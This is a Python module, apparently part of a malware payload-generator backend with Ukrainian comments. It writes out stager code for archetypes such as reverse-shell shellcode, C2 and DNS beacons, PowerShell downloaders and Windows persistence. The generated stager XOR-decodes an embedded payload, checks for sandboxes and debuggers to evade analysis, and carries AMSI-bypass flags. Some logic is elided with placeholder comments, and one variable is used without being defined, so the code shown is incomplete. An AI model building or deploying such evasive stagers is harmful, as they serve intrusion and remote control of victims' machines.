# File: CYBER_DASHBOARD_BACKEND/payload_generator/stager_templates.py
# Координатор: Синтаксис
# Опис: Модифіковано для використання функції stager_log та умовного логування.

import random 
import os 
from datetime import datetime 

import config 

def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfuscated_data_b64: str, validated_params: dict, log_messages: list) -> str:
    """
    Генерує рядковий Python-код для вказаного архетипу стейджера.
    Тепер використовує stager_log для діагностичного виводу.
    """
    log_messages.append(f"[STAGER_TEMPLATE_INFO] Генерація коду для архетипу: {archetype_name}")

    enable_evasion_checks = validated_params.get('enable_evasion_checks', False)
    enable_amsi_bypass_concept = validated_params.get('enable_amsi_bypass_concept', False)
    enable_disk_size_check = validated_params.get('enable_disk_size_check', False)
    
    # Отримання нового параметра для логування
    stager_logging_enabled = validated_params.get('enable_stager_logging', False)

    stager_code_lines = [
        f"# SYNTAX Conceptual Python Stager (Backend Generated v{config.VERSION_BACKEND})",
        f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"# Archetype: {archetype_name}",
        f"OBFUSCATION_KEY_EMBEDDED = \"{obfuscation_key}\"",
        f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
        f"METAMORPHISM_APPLIED_META = {validated_params.get('enable_stager_metamorphism', False)}", # Змінено ім'я, щоб не конфліктувати
        f"EVASION_CHECKS_APPLIED_META = {enable_evasion_checks}",
        f"AMSI_BYPASS_CONCEPT_APPLIED_META = {enable_amsi_bypass_concept}",
        f"DISK_SIZE_CHECK_APPLIED_META = {enable_disk_size_check}",
        f"STAGER_LOGGING_ENABLED_META = {stager_logging_enabled}", # Додано мета-змінну
    ]

    if archetype_name == "powershell_downloader_stager":
        ps_args = validated_params.get("powershell_execution_args", "")
        stager_code_lines.append(f"POWERSHELL_EXEC_ARGS_META = \"{ps_args}\"")
    elif archetype_name == "demo_c2_beacon_payload":
        stager_implant_id = f"STGIMPLNT-{random.randint(100,999)}"
        stager_code_lines.append(f"STAGER_IMPLANT_ID_META = \"{stager_implant_id}\"")
        stager_code_lines.append(f"BEACON_INTERVAL_SEC_META = {random.randint(10, 25)}")
    elif archetype_name == "dns_beacon_c2_concept":
        stager_implant_id = f"DNSIMPLNT-{random.randint(100,999)}"
        stager_code_lines.append(f"STAGER_IMPLANT_ID_META = \"{stager_implant_id}\"")
        stager_code_lines.append(f"DNS_BEACON_SUBDOMAIN_PREFIX_META = \"{validated_params.get('dns_beacon_subdomain_prefix')}\"")
        stager_code_lines.append(f"DNS_BEACON_INTERVAL_SEC_META = {random.randint(25, 55)}")

    stager_code_lines.extend([
        "", 
        "import base64", 
        "import os", 
        "import time", 
        "import random", 
        "import string", 
        "import subprocess", 
        "import socket", 
        "import json as json_stager_module"
    ])
    
    if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept":
        stager_code_lines.extend(["import urllib.request", "import urllib.error"])

    needs_ctypes = False
    if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
       enable_evasion_checks or enable_amsi_bypass_concept or enable_disk_size_check:
        needs_ctypes = True
        if "import ctypes" not in stager_code_lines: stager_code_lines.append("import ctypes")

    needs_shutil = False
    if (enable_disk_size_check and os.name != 'nt'): 
        needs_shutil = True
    
    if needs_shutil and "import shutil" not in stager_code_lines:
         stager_code_lines.append("import shutil")

    if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
        if "import mmap as mmap_module" not in stager_code_lines:
            stager_code_lines.append("import mmap as mmap_module")
    
    stager_code_lines.append("")

    # Визначення функції логування та прапорця DEBUG_MODE
    stager_code_lines.extend([
        f"STAGER_DEBUG_MODE = {stager_logging_enabled}", # Встановлюється на основі параметра генерації
        "def stager_log(message_sl):", # Використовуємо унікальне ім'я аргументу
        "    if STAGER_DEBUG_MODE:",
        "        print(f\"[STG_LOG] {{message_sl}}\")", # Додаємо префікс для логів стейджера
        ""
    ])

    decode_func_name_runtime = "dx_runtime"
    evasion_func_name_runtime = "ec_runtime"
    execute_func_name_runtime = "ex_runtime"

    # Замінюємо print() на stager_log() у відповідних місцях
    stager_code_lines.extend([
        f"def {decode_func_name_runtime}(b64_data, key_str):",
        "    try:",
        "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
        "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')",
        "    except Exception as e_decode_rt: return f\"DECODE_ERROR_RUNTIME: {{str(e_decode_rt)}}\"",
        "    o_chars = []",
        "    for i_char_idx in range(len(temp_decoded_str)):",
        "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
        "    return \"\".join(o_chars)",
        "",
        f"def {evasion_func_name_runtime}():",
        "    stager_log(\"Виконання розширених концептуальних перевірок ухилення...\")", # Замінено print
        "    indicators = []",
        # ... (решта логіки evasion_func_name_runtime з заміною print на stager_log) ...
        "    try:",
        "        current_user = os.getlogin().lower()",
        "        if current_user in common_sandbox_users: indicators.append('common_username_detected_rt')",
        "    except Exception: pass",
        "    try:",
        "        if os.name == 'nt':",
        "            kernel32_ev_dbg = ctypes.windll.kernel32",
        "            if kernel32_ev_dbg.IsDebuggerPresent() != 0:",
        "                indicators.append('debugger_present_win_rt')",
        "    except Exception: pass",
        # ... (і так далі для всіх print у цій функції) ...
        "    if indicators:",
        "        stager_log(f\"Виявлено індикатори: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")", # Замінено print
        "        return True",
        "    stager_log(\"Перевірки ухилення пройдені (концептуально).\")", # Замінено print
        "    return False",
        "",
        f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
        "    try:",
        "        payload_params = json_stager_module.loads(payload_params_json)",
        "    except Exception as e_json_parse_rt:",
        "        stager_log(f\"[PAYLOAD_RUNTIME_ERROR] Помилка розпаковки параметрів: {{e_json_parse_rt}}\")", # Замінено print
        "        return",
        "    stager_log(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Ініціалізація логіки з параметрами: {{str(payload_params)[:200]}}...\")", # Замінено print
        # ... (решта логіки execute_func_name_runtime з заміною print на stager_log) ...
        "    if arch_type == 'demo_echo_payload':",
        "        stager_log(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Відлуння: {{payload_params.get('message')}}\")", # Замінено print
        # ... (і так далі для всіх print у цій функції) ...
        "    stager_log(f\"[PAYLOAD_RUNTIME ({{arch_type}})] Завершення логіки пейлоада.\")", # Замінено print
        "",
        "if __name__ == '__main__':",
        f"    stager_log(f\"Стейджер для '{archetype_name}' запускається...\")", # Замінено print
        "    sandbox_detected_flag_main = False",
        # Змінюємо імена мета-змінних, щоб вони не конфліктували з локальними
        "    if EVASION_CHECKS_APPLIED_META or AMSI_BYPASS_CONCEPT_APPLIED_META or DISK_SIZE_CHECK_APPLIED_META:",
        f"        sandbox_detected_flag_main = {evasion_func_name_runtime}()",
        "    if not sandbox_detected_flag_main:",
        f"        decoded_payload_parameters_json_main = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
        "        if \"DECODE_ERROR_RUNTIME\" in decoded_payload_parameters_json_main:",
        "            stager_log(f\"[STAGER_MAIN_ERROR] Не вдалося розшифрувати параметри пейлоада: {{decoded_payload_parameters_json_main}}\")", # Замінено print
        "        else:",
        f"            {execute_func_name_runtime}(decoded_payload_parameters_json_main, \"{archetype_name}\")",
        "    else:",
        "        stager_log(\"[STAGER_MAIN] Виявлено аналітичне середовище, нормальний шлях виконання пропущено.\")", # Замінено print
        "    stager_log(\"[STAGER_MAIN] Стейджер завершив роботу.\")" # Замінено print
    ])
    
    final_stager_code = "\n".join(line for line in stager_code_lines if line is not None)
    log_messages.append(f"[STAGER_TEMPLATE_SUCCESS] Код для архетипу {archetype_name} згенеровано (з умовним логуванням).")
    return final_stager_code
